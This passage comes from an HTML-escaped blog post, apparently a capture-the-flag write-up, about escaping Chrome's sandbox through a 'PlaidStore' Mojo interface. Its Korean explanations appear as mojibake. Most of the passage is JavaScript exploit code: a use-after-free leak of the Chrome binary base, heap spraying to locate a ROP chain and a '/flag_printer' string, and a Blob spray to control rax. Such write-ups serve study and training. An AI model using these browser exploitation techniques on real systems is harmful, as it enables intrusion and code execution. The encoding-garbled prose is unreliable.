        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0fff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;pie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2d5f9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PlaidStoreImpl ê°ì²´ ì•ˆì—ëŠ” vtableì²˜ëŸ¼ chrome binary base ì£¼ì†Œë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆëŠ” ê°’ì´ ì¡´ì¬í•œë‹¤. ë”°ë¼ì„œ PlaidStoreImplë¥¼ í• ë‹¹ë°›ê³  freeí•œ ë’¤ì— ë¹„ìŠ·í•œ í¬ê¸°ë¡œ chunkë¥¼ í• ë‹¹ë°›ì•„ ê·¸ ìœ„ì¹˜ë¶€í„° í™ì„ ì½ë‹¤ ë³´ë©´ í™˜ê²½ì— ìƒê´€ì—†ì´ í•­ìƒ binary baseë¥¼ êµ¬í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;2-ì›í•˜ëŠ”-ê°’ì´-ìˆëŠ”-memory-ì£¼ì†Œ-êµ¬í•˜ê¸°&quot;&gt;2. ì›í•˜ëŠ” ê°’ì´ ìˆëŠ” memory ì£¼ì†Œ êµ¬í•˜ê¸°&lt;/h3&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leak_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStorePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;Mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bindInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/flag_printer&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStorePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;Mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bindInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;storeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

      &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;storeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;key3&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;key3&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// find heap&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                  &lt;span class=&quot;nx&quot;&gt;stradd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stradd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ ì½”ë“œëŠ” rop chainì´ ìˆëŠ” heap ë©”ëª¨ë¦¬ë¥¼ ì–»ì–´ì•¼ í•˜ëŠ” ìƒí™©ì²˜ëŸ¼ ì•Œê³ ìˆëŠ” ì£¼ì†Œì— ì›í•˜ëŠ” ê°’ì´ ìˆì–´ì•¼ í• ë•Œ ì‚¬ìš©í–ˆë‹¤. PlaidStoreImplë¥¼ í• ë‹¹í•  ë•Œ ì›í•˜ëŠ” í¬ê¸°ì— ì›í•˜ëŠ” ê°’ì´ ìˆëŠ” uint8_t vectorê°€ ê°™ì´ í• ë‹¹ë˜ê¸° ë•Œë¬¸ì— ê·¸ê±¸ ì—¬ëŸ¬ë²ˆ í• ë‹¹í•˜ê³  freeí•œ ë’¤ vectorê°€ ê°€ì§€ê³  ìˆëŠ” íŠ¹ì • íŒ¨í„´ìœ¼ë¡œ heap pointerë¥¼ ì°¾ì•„ëƒˆë‹¤. ì´ê²ƒì„ í†µí•´ â€œ/flag_printerâ€ ë¬¸ìì—´ê³¼ rop chainì´ ìˆëŠ” heap memory ì£¼ì†Œë¥¼ ì•Œì•„ì™”ë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-heap-sprayë¥¼-í†µí•´-rax-ì¡°ì‘í•˜ê¸°&quot;&gt;3. heap sprayë¥¼ í†µí•´ rax ì¡°ì‘í•˜ê¸°&lt;/h3&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;spray_blobs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;z_small&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blob_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Blob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
